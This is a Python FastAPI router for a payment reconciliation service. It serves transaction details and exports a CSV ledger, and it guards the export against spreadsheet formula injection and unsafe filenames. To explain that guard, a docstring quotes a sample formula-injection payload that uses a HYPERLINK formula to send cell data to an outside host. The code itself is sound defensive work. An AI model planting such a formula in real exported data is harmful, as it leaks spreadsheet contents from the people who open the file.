import csv
import io
import re
from typing import Any, List, Optional
from fastapi import APIRouter, Depends, HTTPException, Query, Response
from sqlalchemy.orm import Session

from src.api.schemas import TransactionDetailResponse
from src.db.database import get_db
from src.db.repository import FinanceRepository

router = APIRouter(prefix="/api/runs", tags=["transactions"])

#: Leading characters that make a spreadsheet treat a cell as a formula.
_CSV_INJECTION_PREFIXES = ("=", "+", "-", "@", "\t", "\r")

#: Characters allowed in a run id when it is echoed into a Content-Disposition
#: filename. Anything else is stripped rather than escaped.
_UNSAFE_FILENAME_CHARS = re.compile(r"[^A-Za-z0-9._-]")


def _csv_safe(value: Any) -> Any:
    """
    Neutralises spreadsheet formula injection in a CSV cell.

    The Reason and Recommended Action columns carry free text authored by the
    LLM (and, via uploaded CSVs, by whoever supplied the data). A value like
    ``=HYPERLINK("http://x/?"&A1)`` is inert in the API response but executes
    when the exported ledger is opened in Excel, Sheets, or LibreOffice, so it
    is prefixed with an apostrophe here. Numeric cells are passed through
    untouched so amounts stay machine-readable.
    """
    if value is None or isinstance(value, (int, float)):
        return value
    text = str(value)
    if text.startswith(_CSV_INJECTION_PREFIXES):
        return "'" + text
    return text


@router.get("/{run_id}/transactions", response_model=List[TransactionDetailResponse])
def get_run_transactions(
    run_id: str,
    status: Optional[str] = Query(None, description="Filter by status (RECONCILED / EXCEPTION)"),
    exception_type: Optional[str] = Query(None, description="Filter by exception category"),
    db: Session = Depends(get_db),
):
    """
    Returns transactions for a run.
    """
    run = FinanceRepository.get_run(db, run_id)
    if not run:
        raise HTTPException(status_code=404, detail=f"Run '{run_id}' not found")

    transactions = FinanceRepository.get_transactions_by_run(
        db=db,
        run_id=run_id,
        status=status,
        exception_type=exception_type,
    )

    results = []
    for t in transactions:
        detail = FinanceRepository.get_transaction_detail(db, run_id, t.transaction_id)
        if detail:
            results.append(TransactionDetailResponse(**detail))
    return results


@router.get("/{run_id}/transactions/{transaction_id}", response_model=TransactionDetailResponse)
def get_transaction_detail(run_id: str, transaction_id: str, db: Session = Depends(get_db)):
    """
    Returns full details for a single transaction including Phase 1 result & Phase 2 investigation.
    """
    run = FinanceRepository.get_run(db, run_id)
    if not run:
        raise HTTPException(status_code=404, detail=f"Run '{run_id}' not found")

    detail = FinanceRepository.get_transaction_detail(db, run_id, transaction_id)
    if not detail:
        raise HTTPException(status_code=404, detail=f"Transaction '{transaction_id}' not found in run '{run_id}'")

    return TransactionDetailResponse(**detail)


@router.get("/{run_id}/export/csv")
def export_run_transactions_csv(run_id: str, db: Session = Depends(get_db)):
    """
    Exports the reconciliation ledger for a run as a downloadable CSV file.
    """
    run = FinanceRepository.get_run(db, run_id)
    if not run:
        raise HTTPException(status_code=404, detail=f"Run '{run_id}' not found")

    transactions = FinanceRepository.get_transactions_by_run(db=db, run_id=run_id)

    output = io.StringIO()
    writer = csv.writer(output)
    writer.writerow([
        "Transaction ID",
        "Status",
        "Exception Type",
        "Payment Amount",
        "Gross Amount",
        "Fee",
        "Expected Net Amount",
        "Bank Amount",
        "Difference",
        "AI Decision",
        "Confidence",
        "Reason",
        "Recommended Action",
    ])

    for t in transactions:
        detail = FinanceRepository.get_transaction_detail(db, run_id, t.transaction_id)
        inv = detail.get("agent_investigation") if detail else None

        if inv:
            decision = inv.get("decision") or "N/A"
            # confidence is nullable in the DB; treat a missing value as
            # "not measured" rather than rendering it as full confidence.
            raw_conf = inv.get("confidence")
            confidence = "N/A" if raw_conf is None else f"{float(raw_conf) * 100:.0f}%"
            reason = inv.get("reason") or ""
            recommended_action = inv.get("recommended_action") or ""
        elif t.status == "RECONCILED":
            decision, confidence = "RECONCILED", "100%"
            reason, recommended_action = "Reconciled successfully", ""
        else:
            decision, confidence = "HUMAN_REVIEW", "0%"
            reason, recommended_action = "", ""

        writer.writerow([
            _csv_safe(t.transaction_id),
            _csv_safe(t.status),
            _csv_safe(t.exception_type or "None"),
            t.payment_amount if t.payment_amount is not None else "",
            t.gross_amount if t.gross_amount is not None else "",
            t.fee if t.fee is not None else "",
            t.expected_net_amount if t.expected_net_amount is not None else "",
            t.bank_amount if t.bank_amount is not None else "",
            t.difference if t.difference is not None else 0,
            _csv_safe(decision),
            confidence,
            _csv_safe(reason),
            _csv_safe(recommended_action),
        ])

    csv_content = output.getvalue()
    safe_run_id = _UNSAFE_FILENAME_CHARS.sub("_", run_id)[:64] or "run"
    filename = f"reconciliation_ledger_{safe_run_id}.csv"
    return Response(
        content=csv_content,
        media_type="text/csv",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )

